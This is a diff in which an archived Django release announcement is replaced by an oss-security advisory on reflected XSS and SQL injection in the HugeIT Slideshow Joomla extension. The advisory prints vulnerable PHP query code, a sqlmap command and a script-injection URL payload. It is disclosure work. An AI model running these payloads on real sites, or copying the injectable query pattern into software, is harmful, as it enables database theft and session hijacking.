@@ -1,24 +1,102 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/18/14
-Message-Id: <0e221d12-4d59-429d-ba36-80711fca156c@googlegroups.com>
-Date: Mon, 18 Jul 2016 11:56:22 -0700 (PDT)
-From: Tim Graham <timograham@...il.com>
-To: django-announce <django-announce@...glegroups.com>
-Cc: django-developers@...glegroups.com, django-users@...glegroups.com,  oss-security@...ts.openwall.com
-Subject: [ANNOUNCE] Django security releases issued: 1.10 release candidate 1, 1.9.8, and 1.8.14
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/26/3
+Message-id: <CC1DF991-C97A-45A4-901A-FCC32780778D@me.com>
+Date: Tue, 26 Jul 2016 08:35:32 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Reflected XSS & SQLi in HugeIT slideshow v1.0.4
 Content-Type: text/plain; charset=utf-8
 
-Today the Django team issued 1.10 release candidate 1, 1.9.8, and 1.8.14 as 
-part of our security process. This releases address a security issue, and 
-we encourage all users to upgrade as soon as possible.
+Title: Reflected XSS & SQLi in HugeIT slideshow v1.0.4
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-07-17
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/slideshow/slideshow
+Vendor: www.hugeit.com
+Vendor Notified: 2016-07-17, fixed in v1.0.6
+Vendor Contact: info@...e-it.com
+Description: Huge-IT Slideshow Extension is one of the powerful products that our company offers. It gives style and charm to your site and help to attract the attention of visitors to certain parts of the content.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability.
 
-Details are available on the Django project weblog:
+The following functions in ./models/slideshow.php are vulnerable to SQL injection as all parameters being passed to them are not sanitized:
 
-https://www.djangoproject.com/weblog/2016/jul/18/security-releases/
 
-As a reminder, we ask that potential security issues be reported via 
-private email to security@...ngoproject.com and not via Django's Trac 
-instance or the django-developers list. Please see 
-https://www.djangoproject.com/security for further information.
+ 51     public function getPropertie() {
+ 52         $db = JFactory::getDBO();
+ 53         $id_cat = JRequest::getVar('id');
+ 54         $query = $db->getQuery(true);
+ 55         $query->select('#__huge_itslideshow_images.name as name,'
+ 56                 . '#__huge_itslideshow_images.id ,'
+ 57                 . '#__huge_itslideshow_slideshows.name as portName,'
+ 58                 . 'slideshow_id, #__huge_itslideshow_images.description as     description,image_url,sl_url,sl_type,link_target,#__huge_itslideshow_imag    es.ordering,#__huge_itslideshow_images.published,published_in_sl_width');
+ 59         $query->from(array('#__huge_itslideshow_slideshows' => '#__huge_it    slideshow_slideshows', '#__huge_itslideshow_images' => '#__huge_itslidesho    w_images'));
+ 60         $query->where('#__huge_itslideshow_slideshows.id = slideshow_id')-    >where('slideshow_id=' . $id_cat);
+ 61         $query->order('ordering desc');
+ 62         $db->setQuery($query);
+ 63         $results = $db->loadObjectList();
+ 64         return $results;
+ 65     }   
 
-Content of type "text/html" skipped
+
+
+ 67     public function getImageByID() {
+ 68         $db = JFactory::getDBO();
+ 69         $id_cat = JRequest::getVar('id');
+ 70         $query = $db->getQuery(true);
+ 71         $query->select('*');
+ 72         $query->from('#__huge_itslideshow_images');
+ 73         $query->where('slideshow_id=' . $id_cat);
+ 74         $db->setQuery($query);
+ 75         $results = $db->loadObjectList();
+ 76         return $results;
+ 77     } 
+
+
+
+  79    public function save($data) {
+ 80         $db = JFactory::getDBO();
+ 81         $result = $this->getPropertie();
+ 82         $this->updarteSlideshow();
+ 83         $this->selectStyle();
+ 84         foreach ($result as $key => $value) {
+ 85             $imageId = $value->id;
+ 86             $id = $data['imageId'. $imageId];
+ 87             $titleimage = $data['titleimage' . $imageId];
+ 88             $im_description = $data['im_description'. $imageId];
+ 89             $sl_url = $data['sl_url'. $imageId];
+ 90             $sl_link_target = $data['sl_link_target'. $imageId];
+ 91             $ordering = $data['order_by_'. $imageId];
+ 92             $image_url = $data['image_url'. $imageId];
+ 93 
+ 94             $query = $db->getQuery(true);
+ 95             $query->update('#__huge_itslideshow_images')->set('name="' . $    titleimage . '"')->set('description="' . $im_description . '"')
+ 96                     ->set('sl_url="' . $sl_url . '"')->set('link_target="'     . $sl_link_target . '"')
+ 97                     ->set('ordering="' . $ordering . '"')->set('image_url=    "' . $image_url . '"')->where('id=' . $imageId);
+ 98             $db->setQuery($query);
+ 99             $db->execute();
+
+The rest of these source files all have similar vulnerabilities:
+
+./models/fields/slideshow.php
+./models/slideshows.php
+./models/video.php
+./models/forms/general.php
+./models/general.php
+
+
+Refective XSS in ./views/slideshow/tmpl/default.php in id parameter.
+
+117:  <a class="modal" rel="{handler: 'iframe', size: {x: 800, y: 500}}" href="index.php?option=com_slideshow&view=video&tmpl=component&pid=<?php echo $_GET['id']; ?>" title="Video" >
+
+CVE-2016-1000117 XSS
+CVE-2016-1000118 SQLi
+
+Exploit Code:
+	• SQLi:
+	•  
+	• $ sqlmap  --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/index.php?option=com_slideshow&view=slideshow&id=*" --dbms mysql 
+	•  
+	• XSS:
+	•  
+	• http://192.168.0.125/administrator/index.php?option=com_slideshow&view=slideshow&id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+Advisory: http://www.vapidlabs.com/advisory.php?v=166
